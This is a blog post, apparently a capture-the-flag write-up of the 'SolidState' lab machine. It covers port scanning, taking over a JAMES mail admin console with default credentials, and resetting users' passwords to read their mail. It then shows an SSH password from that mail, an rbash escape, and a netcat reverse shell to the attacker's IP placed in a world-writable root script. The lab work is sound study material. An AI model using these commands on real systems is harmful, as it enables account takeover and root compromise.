---
layout: post
title: "solidstate"
date: 2025-09-08 
categories: OSCP Playlist
---
# solidstate

# Summary

- rustscan to get all ports
- used nc to interact with port 4555, logged in with root:root
- email admin ability to change other user’ password, read users’ email to get ssh credential
- escape rbash
- linpeas to find world writable script owned by root
- pspy to see running processes executing script periodically
- inject reverse shell in script to get root

# Attack Path

First let’s enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/solidstate 10.10.10.51

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp  open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.16.7 [10.10.16.7])
110/tcp open  pop3    JAMES pop3d 2.3.2
119/tcp open  nntp    JAMES nntpd (posting ok)
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are email services, ssh and nntp;  used primarily for reading and posting articles to **Usenet newsgroups**. Think of it as an early, distributed discussion system (like forums before the web).

There are limited ports here, let’s do a rustscan to see if there are any hidden ports:

```bash
rustscan -a 10.10.10.51 --ulimit 5000

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
25/tcp   open  smtp    syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
110/tcp  open  pop3    syn-ack ttl 63
119/tcp  open  nntp    syn-ack ttl 63
4555/tcp open  rsip    syn-ack ttl 63

sudo nmap -sV -sC -p 22,25,80,110,119,4555 10.10.10.51 -oN nmap/solidstate2

22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.16.7 [10.10.16.7])
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
```

We also see james-admin remote admin tool. Let’s try and interact with it:

```bash
nc 10.10.10.51 4555 
```

We try a few default credentials:

![image.png]({{ site.baseurl }}/assets/solidstate/image.png)

We are in. Let’s list help:

```bash
HELP

Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

Enumerating:

```bash
listusers

Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

From the help menu, it seems like we can set password to any user and also forward email to another user. Let’s check change password for all users until we find useful emails:

```bash
setpassword mailadmin root
setpassword mindy root
setpassword john root
setpassword thomas root
setpassword james root

```

Now we can check on evolution whether this user has any mail:

![image.png]({{ site.baseurl }}/assets/solidstate/image%201.png)

![image.png]({{ site.baseurl }}/assets/solidstate/image%202.png)

Did not find any. Let’s move on to the next one. Logging on to mindy, we get:

![image.png]({{ site.baseurl }}/assets/solidstate/image%203.png)

```bash
mindy:P@55W0rd1!2@
```

We now have ssh login. Let’s also james’ mail, since it’s likely he’s a senior member of the team.

Nothing. Let’s ssh:

```bash
ssh mindy@10.10.10.51
```

Attempting to enumerate, we find ourselves in restricted bash:

```bash
mindy@solidstate:~$ id

-rbash: id: command not found
```

Let’s relogin and see if we can escape rbash:

```bash
ssh mindy@10.10.10.51 -t "bash --noprofile"
```

We have now escaped:

![image.png]({{ site.baseurl }}/assets/solidstate/image%204.png)

We see no hidden files, no sudo privileges, not in a privileged group.

Now let’s download linpeas onto the target and execute it:

```bash
#attack box
python3 -m http.sever 8001

#target
wget http://10.10.16.7:8001/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

#interesting finds:
/home/james/.bash_history
══╣ Possible private SSH keys were found!
/etc/ImageMagick-6/mime.xml

╔══════════╣ Unexpected in /opt (usually empty)
total 16                                                                                                                                         
drwxr-xr-x  3 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 May 27  2022 ..
drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py

```

The most interesting find is /opt/tmp.py that’s owned by root but world writable. 

We also download pspy32s from the official site and see that [tmp.py](http://tmp.py) was being executed periodically by root:

```bash
wget http://10.10.16.7:8001/pspy32s
chmod +x pspy32s
./pspy32s

<SNIP>
2025/09/08 11:39:01 CMD: UID=0     PID=20919  | /bin/sh -c python /opt/tmp.py 
2025/09/08 11:39:01 CMD: UID=0     PID=20920  | /bin/sh -c python /opt/tmp.py 

```

Now let’s edit the script to get a reverse shell:

```bash
#!/usr/bin/env python
import os
import sys
try:
     os.system('nc -e /bin/bash 10.10.16.7 4444')
except:
     sys.exit()

```

Now start a listener:

```bash
nc -lnpv 4444
```

After a while:

![image.png]({{ site.baseurl }}/assets/solidstate/image%205.png)

We now have root.